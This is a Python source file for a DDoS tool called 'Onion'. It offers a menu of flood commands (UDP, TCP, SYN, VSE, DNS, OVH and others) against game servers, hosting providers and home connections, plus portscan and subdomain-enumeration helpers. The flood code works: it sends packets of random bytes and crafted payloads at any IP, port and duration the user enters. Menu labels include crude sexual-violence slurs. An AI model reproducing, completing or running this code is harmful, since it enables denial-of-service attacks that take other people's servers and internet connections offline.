#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "Matei"


raw = """
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m

\033[31m         ╔══════════════════════════╦════════════════════════════╗
\033[31m         ║                        Onion                           ║
\033[31m         ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[31m          ║ \033[00mtcpraw \033[31m- \033[00mRaw TCP Flood \033[31m║ ║ \033[00mvseraw \033[31m- \033[00mRaw VSE Flood \033[31m  ║
\033[31m          ║ \033[00mstdraw \033[31m- \033[00mRaw STD Flood \033[31m║ ║ \033[00msynraw \033[31m- \033[00mRaw SYN Flood \033[31m  ║
\033[31m         ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[31m         ║    \033[00mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[31m║
\033[31m         ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m

\033[31m        ╔══════════════════════════╦════════════════════════════╗
\033[31m        ║ \033[00movhslav \033[31m- \033[00mSlavic Flood \033[31m  ║ \033[00miotv1 \033[31m- \033[00mCustom Method!  \033[31m   ║
\033[31m        ║ \033[00mcpukill \033[31m- \033[00mCpu Rape Flood\033[31m ║ \033[00miotv2 \033[31m- \033[00mCustom Method!  \033[31m   ║
\033[31m        ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[31m         ║ \033[00mfivemkill \033[31m- \033[00mFivem Kill \033[31m║ ║ \033[00miotv3 \033[31m-\033[00m Custom Method!  \033[31m ║
\033[31m         ║ \033[00micmprape  \033[31m- \033[00mICMP Rape  \033[31m║ ║ \033[00mssdp  \033[31m-\033[00m Amped SSDP      \033[31m ║
\033[31m         ║ \033[00mtcprape \033[31m- \033[00mRaping TCP   \033[31m║ ║ \033[00marknull \033[31m- \033[00mArk Method    \033[31m ║
\033[31m         ║ \033[00mnforape \033[31m- \033[00mNfo Method   \033[31m║ ║ \033[00m2kdown  \033[31m- \033[00mNBA 2K Flood  \033[31m ║
\033[31m        ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[31m        ║    \033[00mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[31m║
\033[31m        ╚═══════════════════════════════════════════════════════╝
"""

private = """
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m
\033[31m         ╔══════════════════════════╦════════════════════════════╗
\033[31m         ║ \033[00mhomeslap    \033[31m. \033[00mr6kill     \033[31m║ \033[00mfivemtcp  \033[31m. \033[00mnfokill       \033[31m ║
\033[31m         ║ \033[00mark255      \033[31m. \033[00marklift    \033[31m║ \033[00mhotspot   \033[31m. \033[00mvpn           \033[31m ║
\033[31m         ║ \033[00mhydrakiller \033[31m. \033[00markdown    \033[31m║ \033[00mnfonull   \033[31m. \033[00mdhcp          \033[31m ║
\033[31m         ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[31m          ║ \033[00movhnat    \033[31m. \033[00movhamp     \033[31m║ ║ \033[00movhwdz    \033[31m. \033[00movhx         \033[31m║
\033[31m          ║ \033[00mnfodrop   \033[31m. \033[00mnfocrush   \033[31m║ ║ \033[00mnfodown   \033[31m. \033[00mnfox         \033[31m║
\033[31m          ║ \033[00mudprape   \033[31m. \033[00mudprapev3  \033[31m║ ║ \033[00mfortnite  \033[31m. \033[00mfortnitev2   \033[31m║
\033[31m          ║ \033[00mudprapev2 \033[31m. \033[00mudpbypass  \033[31m║ ║ \033[00mgreeth    \033[31m. \033[00mtelnet       \033[31m║
\033[31m          ║ \033[00mfivemv2   \033[31m. \033[00mr6drop     \033[31m║ ║ \033[00mr6freeze  \033[31m. \033[00mkillall      \033[31m║
\033[31m          ║ \033[00m2krape    \033[31m. \033[00mfallguys   \033[31m║ ║ \033[00movhdown   \033[31m. \033[00movhkill      \033[31m║
\033[31m          ║ \033[00mfivemrape \033[31m. \033[00mfivemdown  \033[31m║ ║ \033[00mfivemv1   \033[31m. \033[00mfivemslump   \033[31m║
\033[31m          ║ \033[00mkillallv2 \033[31m. \033[00mkillallv3  \033[31m║ ║ \033[00mpowerslap \033[31m. \033[00mrapecom      \033[31m║
\033[31m         ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[31m         ║    \033[00mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[31m║
\033[31m         ╚═══════════════════════════════════════════════════════╝
"""


layer4 = """\033[31m
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m

\033[31m         ╔══════════════════════════╦════════════════════════════╗
\033[31m         ║  \033[00mudp [IP] [TIME] [PORT]  \033[31m║   \033[00mvse [IP] [TIME] [PORT]   \033[31m║
\033[31m         ║  \033[00mtcp [IP] [TIME] [PORT]  \033[31m║   \033[00mack [IP] [TIME] [PORT]   \033[31m║
\033[31m         ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\033[31m          ║ \033[00mstd [IP] [TIME] [PORT] \033[31m║ ║ \033[00mdns [IP] [TIME] [PORT]   \033[31m║
\033[31m          ║ \033[00msyn [IP] [TIME] [PORT] \033[31m║ ║ \033[00movh [IP] [TIME] [PORT]   \033[31m║
\033[31m          ║\033[31m- - - - - - - \033[93mhomerape\033[00m [IP] [TIME] [PORT] \033[31m- - - - - -\033[31m║
\033[31m         ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\033[31m         ║    \033[00mExample How To Attack\033[93m: \033[31mMETHOD [IP] [TIME] [PORT]   \033[31m║
\033[31m         ╚═══════════════════════════════════════════════════════╝
"""

helllp = """\033[31m
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m

          \033[31m╔══════════════════════════════════════════════════════╗
          ║                    \033[00mBASIC COMMANDS\033[31m                    ║
          ╚╦════════════════════════════════════════════════════╦╝
           ║\033[00m Cls                           \033[31m|\033[00m CLEAR SCREEN\033[31m       ║
           ║\033[00m Exit                          \033[31m|\033[00m EXIT  ROOT  \033[31m       ║
           ║\033[00m Methods                       \033[31m|\033[00m Onion METHODS\033[31m      ║
           ║\033[00m Tools                         \033[31m|\033[00m BASIC TOOLS\033[31m        ║
           ╚════════════════════════════════════════════════════╝\033[00m
"""

version = """v 2.0"""

methods = """\033[31m
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m

\033[31m         ╔══════════════════════════════════════════════════════╗
         ║                     \033[00mDDoS METHODS\033[31m                     ║               
         ╚╦════════════════════════════════════════════════════╦╝
          ║ \033[00mLayer4                  \033[31m|        \033[00mipv4 ddos methods \033[31m║
          ║ \033[00mgen3                    \033[31m|        \033[00mgen3 ddos methods \033[31m║
          ║ \033[00mraw                     \033[31m|         \033[00mraw ddos methods \033[31m║
          ║ \033[00mprivate                 \033[31m|    \033[00mbypasses ddos methods \033[31m║
          ╚════════════════════════════════════════════════════╝\033[00m
"""

tools = """\033[31m
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m

          \033[31m╔══════════════════════════════════════════════════════╗
          ║                        \033[00mTOOLS\033[31m                         ║
          ║══════════════════════════════════════════════════════║
          ║ \033[00mStopattacks                   \033[31m|\033[00m STOP ALL ATTACKS\033[31m     ║
          ║ \033[00mPing <HOST>                   \033[31m|\033[00m PING A HOST\033[31m          ║
          ║ \033[00mResolve <HOST>                \033[31m|\033[00m GRAB A DOMIANS IP\033[31m    ║
          ║ \033[00mPortscan <HOST> <RANGE>       \033[31m|\033[00m PORTSCAN A HOST  \033[31m    ║
          ║ \033[00mDnsresolve <HOST>             \033[31m|\033[00m GRAB ALL SUB-DOMAINS\033[31m ║
          ║ \033[00mStats                         \033[31m|\033[00m DISPLAY ONION STATS  \033[31m║
          ╚══════════════════════════════════════════════════════╝\033[00m
"""

banner =  """
                              [38;2;255;0;0m╔[38;2;253;2;12m═[38;2;251;4;24m╗[38;2;249;6;36m╔[38;2;247;8;48m╗[38;2;245;10;60m╔[38;2;243;12;72m╦[38;2;241;14;84m╔[38;2;239;16;96m═[38;2;237;18;108m╗[38;2;235;20;120m╔[38;2;233;22;132m╗[38;2;231;24;144m╔[38;2;229;26;156m
                              [38;2;255;0;0m║[38;2;253;2;12m [38;2;251;4;24m║[38;2;249;6;36m║[38;2;247;8;48m║[38;2;245;10;60m║[38;2;243;12;72m║[38;2;241;14;84m║[38;2;239;16;96m [38;2;237;18;108m║[38;2;235;20;120m║[38;2;233;22;132m║[38;2;231;24;144m║[38;2;229;26;156m
                              [38;2;255;0;0m╚[38;2;253;2;13m═[38;2;251;4;26m╝[38;2;249;6;39m╝[38;2;247;8;52m╚[38;2;245;10;65m╝[38;2;243;12;78m╩[38;2;241;14;91m╚[38;2;239;16;104m═[38;2;237;18;117m╝[38;2;235;20;130m╝[38;2;233;22;143m╚[38;2;231;24;156m╝[0;00m

\033[31m             ╔═══════════════════════════════════════════════╗
\033[31m             ║\033[00m  - - - - - - - - \033[00mType help\033[00m- - - - - - - - - - \033[31m║
\033[31m             ║ \033[00m- - - - - -\033[31mdiscord.gg/urBYXG9r7h\033[00m- - - - - - -\033[31m ║
\033[31m             ╚═══════════════════════════════════════════════╝

\033[31m                ╔════════════════════════════════════════╗
\033[31m                ║\033[00m- -Connection Has Been \033[31m(ESTABILISHED)\033[00m- -\033[31m║
\033[31m                ╚════════════════════════════════════════╝
"""

cookie = open(".Onion_cookie","w+")

fsubs = 0
pscans = 0
liips = 0
tpings = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_ICMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack

	while True:
		sys.stdout.write("\x1b]2;O N I O N    R O O T \x07")
		sin = input("\033[31m[\033[00m{}\033[31m@\033[00mOnion\033[31m]\033[31m: \033[31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "tools":
			os.system ("clear")
			print(tools)
			main()
		elif sinput == "help":
			os.system ("clear")
			print (helllp)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "layer4":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("clear")
			print (gen3)
			main()
		elif sinput == "version":
			print ("version: "+version+" ")
		elif sinput == "stats":
			print ("\033[00m- Attacks: \033[31m{}                                        ".format (tattacks))
			print ("\033[00m- Found Domains: \033[31m{}                                  ".format(fsubs))
			print ("\033[00m- PORTSCANS: \033[31m{}                                      ".format(pscans))
			print ("\033[00m- GRABBED IPS: \033[31m{}\n                                    ".format(liips))
			print ("\033[00mStats for this sesion")
			main()
		elif sinput == "raw":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[31mONION\033[00m] Starting ping on host: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[31mONION\033[00m] Host un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;O N I O N |{}ms| D E M O N S\x07".format (stop))
						print ("Onion: {}:{} | Time: {}ms [\033[31mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;O N I O N |TIME OUT| D E M O N S\x07")
						print ("Onion: {}:{} [\033[31mDOWN\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[31mONION\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "dnsresolve":
			sfound = 0
			sys.stdout.write("\x1b]2;O N I O N |{}| F O U N D\x07".format (sfound))
			try:
				host = sin.split(" ")[1]
				with open(r"/usr/share/sinfull/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + host
						subips = socket.gethostbyname(url)
						print ("[\033[31mONION\033[00m] Domain: https://{} \033[31m>\033[00m Converted: {} [\033[31mEXISTANT\033[00m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;O N I O N |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
				print ("[\033[31mONION\033[00m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE HOST!')
		elif sinput == "portscan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("\033[31m {}\033[31m:\033[00m{} [\033[31mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("\033[31m Host: {} \033[00m[\033[31mConverted\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[31mYour Rocket Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 30000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homerape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemrape":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "r6kill":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "rapecom":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemslump":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfox":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dhcp":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhx":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "powerslap":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vpn":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv1":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivemv2":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "r6freeze":
			try:
				if running >= 1:
					print("\033[31mThere is alrady an attack going.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[31mYour Rocket Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
